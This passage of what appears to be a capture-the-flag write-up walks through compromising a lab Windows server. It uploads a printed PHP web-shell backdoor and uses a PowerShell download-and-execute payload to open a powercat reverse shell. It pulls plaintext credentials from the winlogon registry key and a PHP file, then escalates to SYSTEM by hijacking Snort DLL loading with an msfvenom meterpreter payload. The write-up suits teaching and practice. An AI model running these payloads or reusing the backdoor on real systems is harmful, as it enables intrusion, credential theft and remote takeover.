<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->
```
Which can be found in Kali location `/usr/share/webshells/php/simple-backdoor.php`. Just upload the file and inspect the traffic with Burpsuite. The HTTP response contains the upload path.

![Untitled13](https://github.com/g1vi/AllTheWriteUps/assets/120142960/c7a9daac-8b9c-4949-8f92-36ff5f71502f)

In fact, the upload path is `/dashboard/uploads/simple.php`<br>
<br>
Use this PHP shell to send a reverse shell to our Kali machine with `powercat`. Serve `powercat.ps1` with a Python HTTP server, then download and execute from memory using powershell `downloadstrings`. The payload to use is:
```markdown
cmd=powershell iex(new-object net.webclient).downloadstring('http://<kali ip>/powercat.ps1');powercat -c <kali ip> -p 1919 -e cmd
```
Remember to URL encode to avoid problematic characters in the URL.

![Untitled14](https://github.com/g1vi/AllTheWriteUps/assets/120142960/baa947db-d5e8-456d-a1fd-ef3037cd986d)

A reverse shell is received on port 1919. Although it is not valid to dump user flag, we can enumerate the system from it.
```markdown
> systeminfo

Nom de l'hôte:                              DC-ANALYSIS
Nom du système d'exploitation:              Microsoft Windows Server 2019 Standard
Version du système:                         10.0.17763 N/A version 17763
Type du système:                            x64-based PC
```
After enumeration, we find out the password of user `jdoe` is configured in the winlogon registry key. We retrieve it by means of a registry query.
```markdown
> reg query "hklm\software\microsoft\windows nt\currentversion\winlogon"

HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    analysis.htb.
    DefaultUserName    REG_SZ    jdoe
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x1ab910533
    ShutdownFlags    REG_DWORD    0x13
    DisableLockWorkstation    REG_DWORD    0x0
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    7y4Z4^*y9Zzj
    AutoLogonSID    REG_SZ    S-1-5-21-916175351-3772503854-3498620144-1103
    LastUsedUsername    REG_SZ    jdoe

HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon\AlternateShells
HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon\GPExtensions
HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon\UserDefaults
HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon\VolatileUserMgrKey
```
Additionally, the MySQL credentials are found in the file `c:\inetpub\internal\employees\login.php`
```markdown
db_master
0$TBO7H8s12yh&
```
Use `jdoe:7y4Z4^*y9Zzj` credential to login with `evil-winrm`, and retrieve the user flag.
```markdown
evil-winrm -i $target -u jdoe -p '7y4Z4^*y9Zzj'
```

### SYSTEM
Start from the `evil-winrm` shell and run `winpeas64.exe`. The tool reports a possible DLL hijacking issue related to the Snort service.

![Untitled15](https://github.com/g1vi/AllTheWriteUps/assets/120142960/29b87de3-8633-4454-adcb-a78c8f744465)

Searching for Snort vulnerabilities we find a CVE and an associated POC here:<br>
https://www.cvedetails.com/cve/CVE-2016-1417<br>
https://packetstormsecurity.com/files/138915/Snort-2.9.7.0-WIN32-DLL-Hijacking.html<br>
<br>
According to them, to exploit the vulnerability we are supposed to place in a remote shared folder a malicious `tcapi.dll` along with a `.pcap` capture file in the same folder. Then run Snort and let the application load the malicious DLL. Unfortunately, this procedure was tested and did not work.<br>
<br>
 Enumerating further in the Snort folder, we find a configuration file at  `bin\snort.conf` containing information about pre-processor libraries.
 
 ![Untitled16](https://github.com/g1vi/AllTheWriteUps/assets/120142960/a0b98275-d007-4934-91be-bca2c8f39e5e)
 
In summary, it seems Snort load first dynamic DLL's located at the preprocessor path `c:\Snort\lib\snort_dynamicpreprocessor`<br>
<br>
Create an `msfvenom` payload for a malicious DLL called `sf_engine.dll` and copy to `c:\snort\lib\snort_dynamicpreprocessor`
```markdown
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.xxx.xxx lport=1919 -f dll -a x64 --platform windows -o sf_engine.dll
```
Now start a meterpreter handler and configure as needed.
```markdown
> msfconsole -q
[*] Starting persistent handler(s)...
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set lhost tun0
lhost => 10.10.
msf6 exploit(multi/handler) > set lport 1919
lport => 1919
msf6 exploit(multi/handler) > exploit
```
Shortly after the DLL file is copied into the Snort pre-processor folder, a meterpreter session 1 is opened under the `analysis\administrateur` context.

![Untitled17](https://github.com/g1vi/AllTheWriteUps/assets/120142960/edfca617-38a4-4b93-80be-4622d2d0d7c8)

This shell allows to retrieve the system flag.
